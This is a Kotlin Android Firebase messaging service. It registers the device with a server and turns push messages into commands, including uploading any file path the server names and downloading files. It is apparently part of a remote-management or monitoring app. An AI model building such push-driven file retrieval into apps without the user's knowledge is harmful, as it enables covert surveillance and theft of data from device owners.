// MyFirebaseMessagingService.kt
package com.example.lta

import android.util.Log
import androidx.work.Data
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.WorkManager
import androidx.work.Constraints
import androidx.work.NetworkType
import androidx.work.workDataOf
import com.google.firebase.messaging.FirebaseMessagingService
import com.google.firebase.messaging.RemoteMessage
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.launch
import kotlinx.coroutines.plus

class MyFirebaseMessagingService : FirebaseMessagingService() {

    companion object {
        private const val TAG = "MyFirebaseMsgService"
        private const val COMMAND_KEY = "command"
    }

    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    override fun onNewToken(token: String) {
        super.onNewToken(token)
        Log.d(TAG, "New FCM token received: $token. Registering with server.")
        sendRegistrationToServer(token)
    }
    
    // ... onTokenDeleted and sendRegistrationToServer are unchanged
    fun onTokenDeleted() {
        Log.d(TAG, "FCM token deleted. Notifying server to remove device.")
        val context = applicationContext
        val apiClient = ApiClient(context.getString(R.string.server_base_url))
        val systemInfoManager = SystemInfoManager(context)
        val deviceId = systemInfoManager.getDeviceId()
        serviceScope.launch {
            try {
                val success = apiClient.deleteDevice(deviceId)
                Log.i(TAG, "Device removal from server: ${if (success) "successful" else "failed"}")
            } catch (e: Exception) {
                Log.e(TAG, "Error notifying server of token deletion", e)
            }
        }
    }

    private fun sendRegistrationToServer(token: String) {
        val context = applicationContext
        val apiClient = ApiClient(context.getString(R.string.server_base_url))
        val systemInfoManager = SystemInfoManager(context)
        val appPrefs = AppPreferences(context)
        val deviceModel = systemInfoManager.getDeviceModel()
        val deviceId = systemInfoManager.getDeviceId()
        serviceScope.launch {
            try {
                Log.i(TAG, "Attempting automatic registration -> ID: $deviceId, Model: $deviceModel")
                val success = apiClient.registerDevice(token, deviceModel, deviceId)
                appPrefs.setRegistrationStatus(success)
                val statusMessage = if (success) "successful" else "failed"
                Log.i(TAG, "Automatic registration $statusMessage and status updated in preferences")
            } catch (e: Exception) {
                Log.e(TAG, "Error during automatic registration", e)
                appPrefs.setRegistrationStatus(false)
            }
        }
    }


    override fun onMessageReceived(remoteMessage: RemoteMessage) {
        super.onMessageReceived(remoteMessage)
        Log.d(TAG, "FCM Message From: ${remoteMessage.from}")

        if (remoteMessage.data.isNotEmpty()) {
            Log.d(TAG, "Message data payload: ${remoteMessage.data}")

            val command = remoteMessage.data[COMMAND_KEY]
            if (command.isNullOrBlank()) {
                Log.w(TAG, "Received FCM message without a '$COMMAND_KEY' key in data.")
                return
            }
            
            Log.d(TAG, "Received command: '$command'. Scheduling worker.")
            
            // Extract any additional data to pass to the worker
            val extraData = mutableMapOf<String, String>()
            
            when (command) {
                DataFetchWorker.COMMAND_UPLOAD_FILE -> {
                    remoteMessage.data["filePath"]?.let { extraData["filePath"] = it }
                }
                DataFetchWorker.COMMAND_DOWNLOAD_FILE -> {
                    remoteMessage.data["serverFilePath"]?.let { extraData["serverFilePath"] = it }
                }
            }

            if (extraData.isEmpty() && (command == DataFetchWorker.COMMAND_UPLOAD_FILE || command == DataFetchWorker.COMMAND_DOWNLOAD_FILE)) {
                 Log.w(TAG, "Command '$command' received without required path data. Aborting.")
                 return
            }
            
            // Schedule worker with command and any extra data
            DataFetchWorker.scheduleWork(applicationContext, command, extraData)

        } else {
            Log.d(TAG, "Received FCM message with empty data payload")
        }
    }
    
    override fun onDestroy() {
        super.onDestroy()
        serviceScope.cancel()
    }
}
